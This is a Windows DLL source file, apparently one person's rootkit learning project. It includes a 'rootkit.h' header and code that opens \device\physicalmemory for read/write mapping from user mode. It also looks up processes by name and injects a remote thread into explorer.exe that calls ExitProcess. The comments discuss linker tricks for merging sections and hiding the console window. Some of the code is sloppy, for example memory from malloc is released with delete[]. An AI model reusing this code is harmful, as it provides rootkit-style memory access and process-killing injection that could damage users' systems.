#define WX_EXPORTS
#define  _WIN32_WINNT 0x410
#include <windows.h>
#include "Hook.h"
#include "rootkit.h"
#include <Tlhelp32.h>
#include <Winuser.h>
#pragma comment(lib,"Advapi32.lib")
#pragma comment (lib, "ntdll.lib")
// 
// // 作用: 指定节对齐为512字节
// #pragma comment(linker, "/align:128")
// 
// // 作用: 合并节
// // 将.data节和.rdata节合并到.text节(代码节)
// #pragma comment(linker, "/merge:.data=.text")
// #pragma comment(linker, "/merge:.rdata=.text")
// 
// // 作用: 指定子系统为windows (和优化无关)
// // vc编译器默认是console,会有个黑糊糊的CMD窗口,不好看.用windows就好了
// #pragma comment(linker, "/subsystem:windows")


HMODULE hMyModule;
HHOOK	g_Hook =NULL;

//////////////////////////////////////////////////////////////////////////

HANDLE
OpenPhyMem(
	) ;

BOOL GetNativeAPIs () ;

//////////////////////////////////////////////////////////////////////////


VOID WINAPI Test()
{
// 	GetNativeAPIs() ;
// 	OpenPhyMem() ;
	RemoteThread("explorer.exe") ;
}


BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		//	Beep( 750, 300 );
		//	Test() ;
		//	ExitProcess(0); 
		//	::MessageBox( NULL, "Hello (╰_╯)#", "sudami", MB_OK );

			break;
		case DLL_PROCESS_DETACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
    }

    return TRUE;
}


#define OBJ_CASE_INSENSITIVE			0x00000040L

HANDLE
OpenPhyMem(
	)	   
/*++

学习者 : sudami [xiao_rui_119@163.com]
时间   : 08/01/11

功能 :
  从用户态获得 \device\physicalmemory 的句柄

参数 : NULL

返回 : \device\physicalmemory 的句柄
  
--*/
{
	HANDLE hPhyMem;
	OBJECT_ATTRIBUTES oAttr;
	ANSI_STRING aStr;
		
	_RtlInitAnsiString (&aStr, "\\device\\physicalmemory");
						
	UNICODE_STRING uStr;

	if (_RtlAnsiStringToUnicodeString (&uStr, &aStr, TRUE) != STATUS_SUCCESS){		
		return INVALID_HANDLE_VALUE;	
	}

    oAttr.Length			 =  sizeof(OBJECT_ATTRIBUTES);
    oAttr.RootDirectory		 =  NULL;
    oAttr.Attributes		 =  OBJ_CASE_INSENSITIVE;
    oAttr.ObjectName		 =  &uStr;
    oAttr.SecurityDescriptor =  NULL;
    oAttr.SecurityQualityOfService = NULL;

	if (ZwOpenSection (&hPhyMem, SECTION_MAP_READ | SECTION_MAP_WRITE, &oAttr ) != STATUS_SUCCESS) {		
		return INVALID_HANDLE_VALUE;
	}

	return hPhyMem;
}


/*++

  3个函数,就不用注解了
  
--*/
BOOL GetNativeAPIs ()
{
	HMODULE hntdll;
	
	hntdll = GetModuleHandle("ntdll.dll");
	
	*(FARPROC *)&_RtlAnsiStringToUnicodeString = 
		GetProcAddress(hntdll, "RtlAnsiStringToUnicodeString");
	
	*(FARPROC *)&_RtlInitAnsiString = 
		GetProcAddress(hntdll, "RtlInitAnsiString");
	
	if (_RtlAnsiStringToUnicodeString && _RtlInitAnsiString) {
		return TRUE;
	}
	
	return FALSE;
}



DWORD FindProcessID(char* szName)
{
	PROCESSENTRY32						pe;
	HANDLE								hSnapshot;
	DWORD								bRet =0;
	DWORD								dwReqSize, dwMaxSize, dwCount = 0;
	long								nStatus;
	PSYSTEM_PROC_THREAD_INFO	        pProcThd, pProcThdTemp;
	PFNTQUERYSYSTEMINFORMATION			pfNtQuerySystemInformation;
	
	if ( NULL == szName )
	{
		return 0 ;
	}
	pfNtQuerySystemInformation = (PFNTQUERYSYSTEMINFORMATION)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtQuerySystemInformation");
	if (pfNtQuerySystemInformation != NULL)
	{
		dwMaxSize = DEFAULT_ARRAY_SIZE;
		pProcThd = (PSYSTEM_PROC_THREAD_INFO)malloc(dwMaxSize);
		while ((pProcThd != NULL) &&
			((nStatus = pfNtQuerySystemInformation(5, pProcThd, dwMaxSize, &dwReqSize)) == 0xC0000004))
		{
			dwMaxSize = (dwReqSize >= dwMaxSize)?dwReqSize:(dwMaxSize+DEFAULT_ARRAY_SIZE);
			pProcThd = (PSYSTEM_PROC_THREAD_INFO)realloc(pProcThd, dwMaxSize);
		}
		
		if (nStatus == 0)
		{
			dwCount = 1;
			pProcThdTemp = pProcThd;
			
			while (pProcThdTemp->Process.NextEntryOffset)
			{
				pProcThdTemp = (PSYSTEM_PROC_THREAD_INFO)((LPBYTE)pProcThdTemp + pProcThdTemp->Process.NextEntryOffset);
				dwCount ++;
			}
			
			pProcThdTemp = pProcThd;
			//find SYSTEM process
			hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			if (hSnapshot != INVALID_HANDLE_VALUE)
			{
				pe.dwSize = sizeof(PROCESSENTRY32);
				if (Process32First(hSnapshot, &pe))
				{
					do {
						if (dwCount == 0)
							break;
						
						if (stricmp(pe.szExeFile, szName) == 0)
						{
							return pe.th32ProcessID;
							break;
						}
						pProcThdTemp = (PSYSTEM_PROC_THREAD_INFO)((LPBYTE)pProcThdTemp + pProcThdTemp->Process.NextEntryOffset);
						dwCount --;
					}while (Process32Next(hSnapshot, &pe));
				}
				CloseHandle(hSnapshot);
			}
		}
		
		if (pProcThd != NULL)
			delete[] pProcThd;
	}
	
	return bRet;
}


VOID RemoteThread(char* szName) 
{
	DWORD dwPid = 0;
	HANDLE hProc;

	if ( NULL == szName )
	{
		return ;
	}

	dwPid = FindProcessID(szName) ;
	hProc = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION,0,dwPid);
	CreateRemoteThread(hProc,NULL,0,(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"),"ExitProcess"),NULL,0,NULL);
	CloseHandle(hProc);

}